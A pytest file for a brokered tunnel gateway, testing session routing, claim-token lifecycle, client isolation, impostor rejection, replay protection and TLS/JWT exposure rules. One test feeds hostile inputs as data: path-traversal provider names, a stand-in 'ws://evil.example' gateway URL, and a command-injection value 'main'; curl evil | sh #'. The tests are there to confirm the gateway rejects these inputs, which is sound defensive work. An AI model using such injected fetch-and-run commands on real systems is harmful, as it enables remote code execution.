# Tests for brokered routing (client agent ↔ gateway ↔ server), control ops, and claims.
import asyncio
import base64
import os
import sys
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

pytest.importorskip("websockets")
import websockets  # noqa: E402
from gateway.claims import Claims  # noqa: E402
from gateway.client import GatewayClient  # noqa: E402
from gateway.protocol import (TO_LISTENER, AgentConn, dec, derive_keys, enc,  # noqa: E402
                              node_proof, proof, session_key)
from gateway.server import Gateway  # noqa: E402

SECRET = "gw-secret"


async def _echo(tag: bytes):
    conns = set()

    async def handle(reader, writer):
        conns.add(writer)
        try:
            while True:
                data = await reader.read(4096)
                if not data:
                    break
                writer.write(tag + data)
                await writer.drain()
        finally:
            conns.discard(writer)
            writer.close()
    s = await asyncio.start_server(handle, "127.0.0.1", 0)
    s.open_conns = conns
    return s, s.sockets[0].getsockname()[1]


async def _stop_echo(server):
    """Since Python 3.12, Server.wait_closed() waits for every open connection to close. The fake
    server agent below never closes its connection to the echo server, so close those first."""
    server.close()
    for writer in list(server.open_conns):
        writer.close()
    await asyncio.wait_for(server.wait_closed(), timeout=5)


async def _server_agent(ws_url, target_port, node_id, node_token=""):
    """A stand-in for the open `rixi-tunnel connect` (auth with node_id, role=server). A box the
    gateway provisioned also proves the registration token it was given."""
    key, _pk = derive_keys(SECRET)
    ws = await websockets.connect(ws_url)
    ch = dec(await ws.recv(), key)
    mine = os.urandom(16).hex()
    auth = {"type": "auth", "proof": proof(_pk, ch["nonce"]), "node_id": node_id, "nonce": mine}
    if node_token:
        auth["node_proof"] = node_proof(node_token, ch["nonce"], mine)
    await ws.send(enc(auth, key))
    conn = AgentConn(ws, session_key(key, ch["nonce"], mine, node_token), sends=TO_LISTENER)
    sessions = {}

    async def pump(sid, reader):
        try:
            while True:
                d = await reader.read(65536)
                if not d:
                    break
                await conn.send({"type": "session_data", "sid": sid,
                                 "data": base64.b64encode(d).decode()})
        finally:
            sessions.pop(sid, None)

    async def loop():
        async for raw in ws:
            o = conn.open(raw)
            if o["type"] == "session_open":
                r, w = await asyncio.open_connection("127.0.0.1", target_port)
                sessions[o["sid"]] = w
                asyncio.create_task(pump(o["sid"], r))
            elif o["type"] == "session_data":
                w = sessions.get(o["sid"])
                if w:
                    w.write(base64.b64decode(o["data"]))
                    await w.drain()
            elif o["type"] == "session_close":
                w = sessions.pop(o["sid"], None)
                if w:
                    w.close()
    return ws, asyncio.create_task(loop())


async def _start_gateway():
    gw = Gateway(SECRET, "127.0.0.1", 0, node_secret="only-the-gateway-knows")
    ws_server = await websockets.serve(gw._on_agent, "127.0.0.1", 0, ping_interval=20)
    return gw, ws_server, f"ws://127.0.0.1:{ws_server.sockets[0].getsockname()[1]}"


async def _wait(fn, timeout=8):
    end = asyncio.get_event_loop().time() + timeout
    while asyncio.get_event_loop().time() < end:
        if fn():
            return True
        await asyncio.sleep(0.05)
    return False


def test_brokered_round_trip_through_client_agent():
    async def run():
        echo, ep = await _echo(b"S:")
        gw, ws_server, url = await _start_gateway()
        sa = ca = None
        try:
            sa = await _server_agent(url, ep, "srv-1")
            assert await _wait(lambda: gw.registry.get("srv-1") is not None)

            ca = GatewayClient(url, SECRET, "client-1")
            await ca.connect()
            assert await _wait(lambda: gw.registry.get("client-1") is not None)

            local, lport = await ca.serve_local("srv-1", "127.0.0.1", 0)
            try:
                r, w = await asyncio.open_connection("127.0.0.1", lport)
                w.write(b"hello")
                await w.drain()
                assert await asyncio.wait_for(r.read(7), timeout=5) == b"S:hello"
                w.close()
            finally:
                local.close()
                await local.wait_closed()
        finally:
            for a in (sa, ca):
                pass
            if ca and ca._loop_task:
                ca._loop_task.cancel()
            if sa:
                sa[1].cancel()
                await sa[0].close()
            ws_server.close()
            await ws_server.wait_closed()
            await _stop_echo(echo)

    asyncio.run(run())


def test_claim_redemption_signals_waiting_client():
    async def run():
        echo, ep = await _echo(b"P:")
        gw, ws_server, url = await _start_gateway()
        sa = None
        ca = GatewayClient(url, SECRET, "C")
        try:
            await ca.connect()
            assert await _wait(lambda: gw.registry.get("C") is not None)
            # a claim is pending for client C (as request_compute would create)
            claim = gw.claims.create("C", "dummy", {})
            # the provisioned server dials in using the token as its node_id
            sa = await _server_agent(url, ep, claim.token, gw.node_token(claim.token))
            assert await _wait(lambda: ca.ready.is_set())
            assert ca.ready_node == claim.token
            assert gw.claims.get(claim.token).status == "active"
        finally:
            if ca._loop_task:
                ca._loop_task.cancel()
            if sa:
                sa[1].cancel()
                await sa[0].close()
            ws_server.close()
            await ws_server.wait_closed()
            await _stop_echo(echo)

    asyncio.run(run())


def test_control_list_and_route():
    async def run():
        echo, ep = await _echo(b"Z:")
        gw, ws_server, url = await _start_gateway()
        sa = None
        ca = GatewayClient(url, SECRET, "ctl")
        try:
            sa = await _server_agent(url, ep, "node-Z")
            await ca.connect()
            assert await _wait(lambda: gw.registry.get("node-Z") is not None)
            nodes = {n["node_id"] for n in await ca.list_nodes()}
            assert "node-Z" in nodes and "ctl" in nodes
            assert (await ca._control("route", node_id="node-Z"))["exists"] is True
            assert (await ca._control("route", node_id="nope"))["exists"] is False
        finally:
            if ca._loop_task:
                ca._loop_task.cancel()
            if sa:
                sa[1].cancel()
                await sa[0].close()
            ws_server.close()
            await ws_server.wait_closed()
            await _stop_echo(echo)

    asyncio.run(run())


def test_claims_token_lifecycle():
    c = Claims()
    claim = c.create("client-x", "dummy", {"gpu": 1}, ttl=0.2)
    assert claim.token.startswith("rxtok_")
    # single redemption only
    assert c.redeem(claim.token, claim.token) is not None
    assert c.redeem(claim.token, claim.token) is None       # already used
    # unknown token
    assert c.redeem("rxtok_nope", "x") is None
    # expiry
    expiring = c.create("client-y", "dummy", {}, ttl=0.05)
    time.sleep(0.1)
    assert expiring.expired
    assert c.redeem(expiring.token, expiring.token) is None


# ── clients and boxes are kept apart ─────────────────────────────────────────

class _Gw:
    """A gateway with clients and agents, cleaned up at the end."""

    async def __aenter__(self):
        self.echo, self.ep = await _echo(b"S:")
        self.gw, self.ws_server, self.url = await _start_gateway()
        self.clients, self.agents = [], []
        return self

    async def client(self, name):
        c = GatewayClient(self.url, SECRET, name)
        await c.connect()
        self.clients.append(c)
        return c

    async def agent(self, node_id, node_token=""):
        a = await _server_agent(self.url, self.ep, node_id, node_token)
        self.agents.append(a)
        return a

    async def __aexit__(self, *exc):
        for c in self.clients:
            if c._loop_task:
                c._loop_task.cancel()
        for ws, task in self.agents:
            task.cancel()
            await ws.close()
        self.ws_server.close()
        await self.ws_server.wait_closed()
        await _stop_echo(self.echo)


async def _reaches(client, node_id) -> bool:
    """Whether a session the client opens to `node_id` is bridged to a box."""
    local, port = await client.serve_local(node_id, "127.0.0.1", 0)
    try:
        r, w = await asyncio.open_connection("127.0.0.1", port)
        w.write(b"hi")
        await w.drain()
        try:
            return await asyncio.wait_for(r.read(4), timeout=1.5) == b"S:hi"
        except asyncio.TimeoutError:
            return False
        finally:
            w.close()
    finally:
        local.close()
        await local.wait_closed()


def test_a_box_somebody_asked_for_is_theirs_alone():
    async def run():
        async with _Gw() as t:
            alice, mallory = await t.client("alice"), await t.client("mallory")
            assert await _wait(lambda: t.gw.registry.get("mallory") is not None)
            claim = t.gw.claims.create("alice", "dummy", {})
            await t.agent(claim.token, t.gw.node_token(claim.token))
            assert await _wait(lambda: alice.ready.is_set())
            # the claim token is what reaches the box: nobody else is told it
            assert claim.token in {n["node_id"] for n in await alice.list_nodes()}
            seen = {n["node_id"] for n in await mallory.list_nodes()}
            assert claim.token not in seen and "alice" not in seen and "mallory" in seen
            assert await _reaches(alice, claim.token)
            # … and even with the token (say, from a log), it is not theirs to use or end
            assert not await _reaches(mallory, claim.token)
            assert (await mallory._control("route", node_id=claim.token))["exists"] is False
            assert (await mallory._control("release", token=claim.token))["released"] is False
            assert t.gw.claims.get(claim.token).status == "active"
            assert (await alice._control("release", token=claim.token))["released"] is True
    asyncio.run(run())


def test_only_the_provisioned_box_registers_under_its_name():
    async def run():
        async with _Gw() as t:
            from gateway.config import ResourceDef
            t.gw.catalog["gpu"] = ResourceDef(name="gpu", provider="dummy", reuse=True)
            claim = t.gw.claims.create("alice", "dummy", {})
            # another holder of the tunnel secret (any box, any client) tries the names
            await t.agent("res-gpu")
            await t.agent("res-gpu", "f" * 64)
            await t.agent(claim.token)
            await t.agent("rxtok_made_up", t.gw.node_token("rxtok_made_up"))
            await asyncio.sleep(0.3)
            assert t.gw.registry.list("server") == [] and claim.status == "pending"
            await t.agent("res-gpu", t.gw.node_token("res-gpu"))
            assert await _wait(lambda: t.gw.registry.get("res-gpu") is not None)
            # a token is for one node id only
            await t.agent(claim.token, t.gw.node_token("res-gpu"))
            await asyncio.sleep(0.2)
            assert t.gw.registry.get(claim.token) is None
    asyncio.run(run())


def test_nobody_takes_the_place_of_a_node_that_is_connected():
    async def run():
        async with _Gw() as t:
            await t.agent("node-Z")
            alice = await t.client("alice")
            assert await _wait(lambda: t.gw.registry.get("alice") is not None)
            first_box, first_client = t.gw.registry.get("node-Z").conn, t.gw.registry.get("alice").conn
            await t.agent("node-Z")                       # an impostor box
            impostor = GatewayClient(t.url, SECRET, "alice")      # an impostor client
            await impostor.connect()
            t.clients.append(impostor)
            await t.client("res-gpu")                     # a client under a box's kind of name
            await asyncio.sleep(0.3)
            assert t.gw.registry.get("node-Z").conn is first_box
            assert t.gw.registry.get("alice").conn is first_client
            assert t.gw.registry.get("res-gpu") is None
            assert await _reaches(alice, "node-Z")        # still the real one
    asyncio.run(run())


def test_a_client_names_a_provider_not_a_path_and_not_the_gateways_own_host():
    async def run():
        async with _Gw() as t:
            alice = await t.client("alice")
            t.gw.allow_dummy = False
            for provider in ("../..", "/", "../../../../tmp", "Dummy", "no-such", ""):
                with pytest.raises(RuntimeError, match="unknown provider"):
                    await alice._control("request_compute", provider=provider, spec={})
            with pytest.raises(RuntimeError, match="dummy provider"):
                await alice._control("request_compute", provider="dummy", spec={})
            assert t.gw.claims.list() == []
            # what a client may choose about its box, and what it may not
            provisioned = []

            async def fake(name, args):
                provisioned.append(args)
                return {}
            t.gw.fire_action = fake
            t.gw.allow_dummy = True
            await alice._control("request_compute", provider="dummy", spec={
                "python_bin": "/tmp/evil", "rixi_dir": "/tmp/evil", "region": "fr-par",
                "gateway_ws_url": "ws://evil.example:1", "instance_type": "DEV1-S"})
            assert await _wait(lambda: provisioned)
            assert provisioned[0]["spec"] == {"region": "fr-par", "instance_type": "DEV1-S"}
            with pytest.raises(RuntimeError, match="not allowed"):
                await alice._control("request_compute", provider="dummy",
                                     spec={"rixi_ref": "main'; curl evil | sh #"})
    asyncio.run(run())


def test_the_gateways_own_settings_stay_out_of_a_dummy_box():
    from gateway.actions.provision import _module, _provider_vars
    out = _provider_vars("dummy", {"python_bin": "/tmp/evil", "rixi_dir": "/tmp/evil"})
    assert out["python_bin"] == sys.executable and "/tmp/evil" not in out.values()
    for bad in ("../..", "/etc", "a/b", ""):
        with pytest.raises(RuntimeError, match="unknown provider"):
            _module(bad)


def test_boxes_asked_for_by_provider_count_toward_quotas_and_budget():
    from gateway.auth import Identity
    from gateway.config import parse_global_policy
    from gateway.policy import PolicyEngine, UsageView
    engine = PolicyEngine(parse_global_policy({
        "quotas": {"max_concurrent_resources": 2, "max_eur_per_hour": 1.0},
        "roles": {"user": {"allowed_ops": ["request_compute", "list"]}}}), {})
    bob = Identity(sub="bob", roles=("user",))
    ask = dict(request={"provider": "scaleway", "instance_type": "L4-1-24G"})
    assert engine.evaluate(bob, "request_compute", **ask, usage=UsageView()).allow
    assert not engine.evaluate(bob, "request_compute", **ask,
                               usage=UsageView(per_identity_boxes={"bob": 2})).allow
    assert not engine.evaluate(bob, "request_compute", **ask,
                               usage=UsageView(fleet_eur_per_hour=0.9)).allow
    # a caller whose role the policy does not define has no permissions, not all of them
    stranger = Identity(sub="eve", roles=("intern",))
    lax = PolicyEngine(parse_global_policy({
        "default_role": "guest", "roles": {"user": {"allowed_ops": ["list"]}}}), {})
    for op in ("teardown", "request_compute", "list"):
        assert not lax.evaluate(stranger, op).allow, op

    async def run():
        async with _Gw() as t:
            t.gw.claims.create("alice", "scaleway", {"instance_type": "L4-1-24G"})
            usage = t.gw._usage()
            assert usage.per_identity_boxes == {"alice": 1} and usage.fleet_eur_per_hour > 0
    asyncio.run(run())


def test_a_recorded_connection_cannot_be_played_back():
    from gateway.protocol import TO_DIALER, seal, unseal
    key = session_key(derive_keys(SECRET)[0], "a" * 32, "b" * 32)
    frames = [seal({"type": "session_data", "sid": "s", "data": str(i)}, key, TO_LISTENER, i)
              for i in range(3)]
    assert [unseal(f, key, TO_LISTENER, i)["data"] for i, f in enumerate(frames)] == ["0", "1", "2"]
    with pytest.raises(Exception):
        unseal(frames[0], key, TO_LISTENER, 1)             # played again
    with pytest.raises(Exception):
        unseal(frames[2], key, TO_LISTENER, 1)             # out of order (one was dropped)
    with pytest.raises(Exception):
        unseal(frames[0], key, TO_DIALER, 0)               # fed back to the side that sent it
    other = session_key(derive_keys(SECRET)[0], "c" * 32, "b" * 32)   # a later connection
    with pytest.raises(Exception):
        unseal(frames[0], other, TO_LISTENER, 0)
    # a node's own token keeps others who hold the shared secret out of its connection
    assert session_key(derive_keys(SECRET)[0], "a" * 32, "b" * 32, "tok") != key

    async def run():
        async with _Gw() as t:
            # an agent of the older protocol (no connection nonce) is not registered
            k, pk = derive_keys(SECRET)
            ws = await websockets.connect(t.url)
            ch = dec(await ws.recv(), k)
            await ws.send(enc({"type": "auth", "proof": proof(pk, ch["nonce"]),
                               "node_id": "old"}, k))
            await asyncio.sleep(0.3)
            assert t.gw.registry.get("old") is None
            await ws.close()
    asyncio.run(run())


def test_the_gateway_serves_tls_when_given_a_certificate(tmp_path):
    import ssl
    sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__)))), "tunnel", "tests"))
    from test_tunnel import _localhost_cert
    cert, key = _localhost_cert(str(tmp_path))

    async def run():
        echo, ep = await _echo(b"S:")
        gw = Gateway(SECRET, "127.0.0.1", 0, node_secret="n", tls_cert=cert, tls_key=key)
        tls = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        tls.load_cert_chain(cert, key)
        ws_server = await websockets.serve(gw._on_agent, "127.0.0.1", 0, ping_interval=20, ssl=tls)
        url = f"wss://127.0.0.1:{ws_server.sockets[0].getsockname()[1]}"
        client = GatewayClient(url, SECRET, "alice", ca_cert=cert)
        try:
            await client.connect()
            assert await _wait(lambda: gw.registry.get("alice") is not None)
            assert "alice" in {n["node_id"] for n in await client.list_nodes()}
            with pytest.raises(Exception):                  # the certificate is not trusted as such
                await GatewayClient(url, SECRET, "bob").connect()
            from gateway.actions.provision import _gateway_url
            assert _gateway_url(gw).startswith("wss://")    # boxes are told to dial TLS
        finally:
            if client._loop_task:
                client._loop_task.cancel()
            ws_server.close()
            await ws_server.wait_closed()
            await _stop_echo(echo)
    asyncio.run(run())


def test_boxes_attached_by_hand_can_be_made_to_prove_themselves_too():
    async def run():
        async with _Gw() as t:
            t.gw.require_node_tokens = True
            await t.agent("my-workstation")                               # no token
            await t.agent("my-workstation", t.gw.node_token("another-node"))
            await asyncio.sleep(0.3)
            assert t.gw.registry.get("my-workstation") is None
            await t.agent("my-workstation", t.gw.node_token("my-workstation"))
            assert await _wait(lambda: t.gw.registry.get("my-workstation") is not None)
    asyncio.run(run())
    # the operator reads a node's token off the gateway's own secret
    a = Gateway("-", "127.0.0.1", 0, node_secret="s1").node_token("my-workstation")
    assert a == Gateway("x", "127.0.0.1", 0, node_secret="s1").node_token("my-workstation")
    assert a != Gateway("-", "127.0.0.1", 0, node_secret="s2").node_token("my-workstation")


# ── easy to start on this machine, not open by accident on a network ──────────

def test_what_a_gateway_needs_before_it_listens_where_others_can_reach_it():
    from gateway.server import exposure
    # this machine only: start it, try it — no JWT, no certificate
    assert exposure("127.0.0.1", dev=False, has_jwt=False, has_tls=False, public_ws_url=None) == (False, [])
    assert exposure("localhost", dev=False, has_jwt=False, has_tls=False, public_ws_url=None) == (False, [])
    # an address others can reach: clients are known by their JWT, and the wire is TLS
    need, missing = exposure("0.0.0.0", dev=False, has_jwt=False, has_tls=False, public_ws_url=None)
    assert need and len(missing) == 2 and "JWT" in missing[0] and "TLS" in missing[1]
    need, missing = exposure("0.0.0.0", dev=False, has_jwt=True, has_tls=False, public_ws_url=None)
    assert need and len(missing) == 1 and "TLS" in missing[0]
    assert exposure("0.0.0.0", dev=False, has_jwt=True, has_tls=True, public_ws_url=None) == (True, [])
    assert exposure("0.0.0.0", dev=False, has_jwt=True, has_tls=False,
                    public_ws_url="wss://gw.example.com") == (True, [])       # TLS ends at a proxy
    assert exposure("0.0.0.0", dev=False, has_jwt=True, has_tls=False,
                    public_ws_url="ws://gw.example.com")[1]
    # --dev: said out loud, nothing is asked
    assert exposure("0.0.0.0", dev=True, has_jwt=False, has_tls=False, public_ws_url=None) == (False, [])


def test_a_gateway_others_can_reach_takes_no_client_without_a_jwt():
    async def run():
        async with _Gw() as t:
            await t.client("dev-client")                      # as started on loopback: fine
            assert await _wait(lambda: t.gw.registry.get("dev-client") is not None)
            t.gw.require_client_jwt = True                    # as started on a public address
            anon = GatewayClient(t.url, SECRET, "anon")
            await anon.connect()
            t.clients.append(anon)
            await asyncio.sleep(0.3)
            assert t.gw.registry.get("anon") is None
            await t.agent("a-box")                            # boxes are not clients: unaffected
            assert await _wait(lambda: t.gw.registry.get("a-box") is not None)
    asyncio.run(run())


def test_the_command_line_refuses_a_public_address_without_jwt_and_tls(monkeypatch, capsys):
    from gateway import server as server_mod
    monkeypatch.setattr(sys, "argv", ["gateway", "--secret", "s", "--ws-bind", "0.0.0.0:7100",
                                      "--config", "/nonexistent.toml"])
    monkeypatch.delenv("RIXI_GATEWAY_DEV", raising=False)
    for var in ("RIXI_JWT_PUBLIC_KEY", "RIXI_JWT_JWKS_URL", "RIXI_GATEWAY_TLS_CERT",
                "RIXI_GATEWAY_TLS_KEY", "RIXI_GATEWAY_PUBLIC_URL"):
        monkeypatch.delenv(var, raising=False)
    with pytest.raises(SystemExit):
        server_mod.main()
    err = capsys.readouterr().err
    assert "refusing to listen on 0.0.0.0" in err and "--dev" in err
    # --dev, or loopback, get as far as serving
    served = []
    monkeypatch.setattr(server_mod.Gateway, "serve", lambda self: served.append(
        (self.ws_host, self.require_client_jwt)) or asyncio.sleep(0))
    monkeypatch.setattr(sys, "argv", ["gateway", "--secret", "s", "--ws-bind", "0.0.0.0:7100",
                                      "--dev", "--config", "/nonexistent.toml"])
    server_mod.main()
    monkeypatch.setattr(sys, "argv", ["gateway", "--secret", "s", "--config", "/nonexistent.toml"])
    server_mod.main()
    assert served == [("0.0.0.0", False), ("127.0.0.1", False)]
